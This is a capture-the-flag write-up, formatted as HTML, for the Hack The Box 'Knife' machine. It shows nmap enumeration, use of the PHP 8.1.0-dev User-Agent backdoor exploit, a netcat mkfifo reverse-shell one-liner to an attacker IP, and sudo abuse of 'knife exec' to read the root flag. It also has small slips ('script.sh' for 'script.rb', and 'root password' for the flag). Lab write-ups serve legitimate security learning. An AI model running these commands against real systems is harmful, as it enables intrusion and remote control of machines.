@@ -1,0 +1,220 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Knife</title>
+<meta name="generator" content="Org mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Knife</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org7c125e2">Enumeration</a></li>
+<li><a href="#orgf432e00">User</a></li>
+<li><a href="#org79f2466">Root</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org7c125e2" class="outline-2">
+<h2 id="org7c125e2">Enumeration</h2>
+<div class="outline-text-2" id="text-org7c125e2">
+<p>
+Starting with Nmap:
+</p>
+
+<pre class="example">
+$ nmap -sC -sV -p1-65535 10.10.10.242
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 16:16 WEST
+Nmap scan report for 10.10.10.242
+Host is up (0.044s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds
+
+</pre>
+
+<p>
+This being an obvious website (port <code>80</code> is open), then it should be added to
+the <code>hosts</code> file, to simplify things:
+</p>
+
+<pre class="example">
+10.10.10.242 knife.htb
+</pre>
+
+<p>
+The website is completely bare-bones. There is a fancy animation, but nothing is
+clickable in the menu top-right. Path bruteforcing does not show any relevant
+results.
+From here, we should look at the response headers. In there we can see that
+<code>Apache Httpd</code> version is <code>2.4.41</code>.
+</p>
+
+<p>
+To see the rest of the response headers, we just run <code>cURL</code> like this:
+</p>
+
+<pre class="example">
+$ curl -v knife.htb
+
+Trying 10.10.10.242:80...
+Connected to knife.htb (10.10.10.242) port 80 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: knife.htb
+&gt; User-Agent: curl/7.76.1
+&gt; Accept: */*
+&gt;
+Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sat, 29 May 2021 15:48:33 GMT
+&lt; Server: Apache/2.4.41 (Ubuntu)
+&lt; X-Powered-By: PHP/8.1.0-dev
+&lt; Vary: Accept-Encoding
+&lt; Transfer-Encoding: chunked
+&lt; Content-Type: text/html; charset=UTF-8
+...
+</pre>
+
+<p>
+The website is also using PHP. Its version is <code>8.1.0-dev</code>, <code>dev</code> being a
+development version. A search on <code>Google</code> for PHP exploits, the
+<a href="https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html">first
+result shows us a way of doing remove command injection!</a>.
+This exploit verifies if <code>PHP/8.1.0-dev</code> appears in the headers and then does a
+<code>GET</code> request with a specific value in <code>User-Agent</code>, something along the lines
+of <code>"User-Agent": "zerodiumsystem("$remote_command");"</code>.
+</p>
+
+<p>
+We save the exploit to <code>exploit.py</code> and try the <code>ls</code> command to test it:
+</p>
+
+<pre class="example">
+$ python exploit.py -u http://knife.htb/ -c ls
+[+] Results:
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+</pre>
+
+<p>
+We got the filesystem root directory and that means the exploit is working for
+this machine.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgf432e00" class="outline-2">
+<h2 id="orgf432e00">User</h2>
+<div class="outline-text-2" id="text-orgf432e00">
+<p>
+Obviously, there is a possibility to do a reverse shell, but using this script
+to run commands seems to suffice.
+Running the <code>id</code> command, we find out the current user is <code>james</code> and the user
+flag is inside <code>/home/james/</code>.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org79f2466" class="outline-2">
+<h2 id="org79f2466">Root</h2>
+<div class="outline-text-2" id="text-org79f2466">
+<p>
+Running the command <code>sudo -l</code> while in user <code>james</code>, we get the following
+information:
+</p>
+
+<pre class="example">
+$ python exploit.py -u http://knife.htb/ -c "sudo -l"
+[+] Results:
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+
+</pre>
+
+<p>
+We can run command <code>knife</code> as root! <code>knife</code> is a command-line tool that provides
+an interface between a <code>chef</code> repo and the <code>Chef Infra Repository</code>
+(<a href="https://docs.chef.io/workstation/knife/">https://docs.chef.io/workstation/knife/</a>).
+In the same link, we can also see that there is a subcommand called <code>exec</code>,
+which runs Ruby scripts. Since we can run <code>knife</code> as root and run Ruby scripts
+with it, probably running system commands through the scripts might be the best
+course of action to get the root flag.
+For this, a reverse shell is useful so we can write to a file. Going throught
+the <code>ssh</code> route seems to be impossible, because it still asks for the password,
+even though we have access to the private key. So reverse shell it is.
+Using netcat to listen (<code>nc -lnvp 1337</code>), we then use the exploit to run the command to connect
+to the reverse shell:
+</p>
+
+<pre class="example">
+$ python exploit.py -u http://knife.htb/ -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.76 1337 &gt;/tmp/f"
+</pre>
+
+<p>
+And on the new shell, we run these commands:
+</p>
+
+<pre class="example">
+$ cd /home/james
+$ echo "system(\"cat /root/root.txt\")" &gt; script.rb
+$ sudo knife exec script.sh
+</pre>
+
+<p>
+The output should be the root password!
+</p>
+
+<hr>
+<footer>
+<p><a class="footer" href="/index.html">Homepage</a></p>
+<p><a class="footer" href="/writeups/htb/index.html">Back</a></p>
+</footer>
+</div>
+</div>
+</div>
+</body>
+</html>
